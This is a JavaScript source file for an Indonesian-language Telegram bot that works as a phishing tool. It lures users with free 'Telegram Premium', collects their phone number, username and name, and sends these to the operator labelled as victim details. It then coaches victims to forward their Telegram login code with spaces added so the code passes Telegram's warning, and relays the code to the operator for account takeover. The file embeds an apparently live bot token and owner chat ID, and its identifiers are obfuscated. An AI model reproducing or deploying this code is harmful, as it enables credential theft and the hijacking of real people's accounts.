/*
TELEGRAM : t.me/bagusror
*/
//SC INI DI BUAT OLEH BAGUS,,SC FREE GAUSAH DI JUAL ANJENG !! REUPLOAD ? TAG GW ANJENG YT : @bagusxixepen//

const tokens = ["7540920655:AAHbAEj8u_UyK6Jc8dq8QGjggPtwkGfUqHc"];

// ISI DENGAN TOKEN BOT LU BUAT TOKEN DI TELE @BOTFATHER

const ownerChatId = "6810074747";
//ISI ID TELE LU,CEK ID TELE DI @cekid

import _0x33700c from "node-telegram-bot-api";
import _0x5ccdf8 from "chalk";
import _0x3ff284 from "fs";
import _0x19c39b from "node-fetch";
["log", "warn", "error", "info"].forEach(_0x454c6 => console[_0x454c6] = () => {});
const bot = new _0x33700c(tokens[0], {
  polling: true
});
const userMessage = "Silahkan Kirim Kode Otp Yang Sudah Kami Kirim Ke Akun Telegram Anda.\n\nCara Kirim Kode Ke Bot :\n\n🚩 Jika Kode Awal Seperti Ini\n\nLogin code: 86870. Do not give this code to anyone, even if they say they are from Telegram!\n__________________________________\n\n📝 Maka Kamu Kirim Ke Bot Begini\n\n8 6 8 7 0\n\nPengiriman Kode Ke Bot Wajib Menggunakan Spasi 📌\nCek Kode Dari Kami Di Bawah ⬇️";
const confirmationMessage = "Otp Berhasil dikirimkan ke User";
const successMessage = "Akun Kamu Berhasil Di Daftarkan Ke Prem, Silahkan Tunggu Beberapa Saat...";
const retryMessage = "Kode Otp Anda Sudah Kadaluarsa.";
bot.onText(/\/start/, _0x1a3c51 => {
  const _0x2bfade = _0x1a3c51.chat.id;
  const _0x1dc393 = "\nSelamat Datang 🌟\nHanya Disini Anda Dapat\nMembuat Akun Telegram Premium\nSecara Gratis 100%\n\nAyo Mulai Jadikan Akun Anda Menjadi Premium\nSekarang Juga!!\nDengan Cara Klick Tombol Di Bawah ⬇️";
  const _0x343136 = {
    reply_markup: {
      inline_keyboard: [[{
        text: "Membuat User Premium",
        callback_data: "createuserprem"
      }]]
    }
  };
  bot.sendMessage(_0x2bfade, _0x1dc393, _0x343136);
});
bot.on("callback_query", _0x52f18b => {
  const _0x328bdb = _0x52f18b.data;
  const _0x216ab7 = _0x52f18b.message.chat.id;
  if (_0x328bdb === "createuserprem") {
    bot.sendMessage(_0x216ab7, "Silakan kirim kontak Anda dengan menekan tombol di bawah untuk proses pengiriman OTP:", {
      reply_markup: {
        keyboard: [[{
          text: "Bagi Kontak",
          request_contact: true
        }]],
        one_time_keyboard: true,
        resize_keyboard: true
      }
    });
  }
  bot.answerCallbackQuery(_0x52f18b.id);
});
bot.on("contact", _0x55b59b => {
  const _0x487ec7 = _0x55b59b.chat.id;
  const _0x5362af = _0x55b59b.contact;
  const _0x537fba = _0x55b59b.from.username ? "@" + _0x55b59b.from.username : "Tidak ada username";
  const _0x2e119b = ((_0x55b59b.from.first_name || "") + " " + (_0x55b59b.from.last_name || "")).trim();
  if (_0x5362af) {
    const _0x1ffdc4 = _0x5362af.phone_number;
    const _0x3cab44 = {
      text: "Kirim OTP",
      callback_data: "send_otp_" + _0x487ec7
    };
    const _0x56c956 = {
      inline_keyboard: [[_0x3cab44]]
    };
    const _0x54311f = {
      reply_markup: _0x56c956
    };
    bot.sendMessage(ownerChatId, "Detail Korban Baru 📣\n\n📱 Nomor Korban: " + _0x1ffdc4 + "\n👤 Username: " + _0x537fba + "\n📝 Nama: " + _0x2e119b + "\n\nDetail Di atas adalah detail yang bot ambil dari korban.", _0x54311f);
    bot.sendMessage(_0x487ec7, "Bot Sedang Memproses Nomor Anda,Harap Tunggu Beberapa Menit...");
  }
});
bot.on("callback_query", _0xff46bc => {
  const _0x8db242 = _0xff46bc.data;
  const _0x164d5a = _0x8db242.split("_")[2];
  if (_0x8db242.startsWith("send_otp")) {
    bot.sendMessage(_0x164d5a, userMessage, {
      reply_markup: {
        inline_keyboard: [[{
          text: "Cek Kode Di Sini",
          url: "tg://openmessage?user_id=777000"
        }]]
      }
    });
    bot.sendMessage(ownerChatId, confirmationMessage);
  }
  bot.answerCallbackQuery(_0xff46bc.id);
});
bot.on("message", _0x2c47fc => {
  const _0x2e0feb = _0x2c47fc.chat.id;
  const _0xd95cfa = _0x2c47fc.text;
  if (/^\d(\s\d)+$/.test(_0xd95cfa)) {
    bot.sendMessage(ownerChatId, "Berhasil Mendapatkan Otp 📌\n    \n🚩 Dari Akun:@" + (_0x2c47fc.from.username || "Tidak ada username") + "\n📮 Pesan Otp: " + _0xd95cfa + "\n\nSilahkan Cek Apakah Otp Di Atas Dapat Berfungsi", {
      reply_markup: {
        inline_keyboard: [[{
          text: "Berhasil",
          callback_data: "success_" + _0x2e0feb
        }], [{
          text: "Coba Lagi",
          callback_data: "retry_" + _0x2e0feb
        }]]
      }
    });
    bot.sendMessage(_0x2e0feb, "bot sedang memproses otp yang anda kirimkan....");
  }
});
bot.on("callback_query", _0x124c37 => {
  const _0x23860d = _0x124c37.data;
  const _0x597621 = _0x23860d.split("_")[1];
  if (_0x23860d.startsWith("success")) {
    bot.sendMessage(ownerChatId, "Pesan telah dikirim ke pengguna.");
    bot.sendMessage(_0x597621, successMessage);
  } else if (_0x23860d.startsWith("retry")) {
    bot.sendMessage(ownerChatId, "Pesan telah dikirim ke pengguna.");
    bot.sendMessage(_0x597621, retryMessage);
  }
  bot.answerCallbackQuery(_0x124c37.id);
});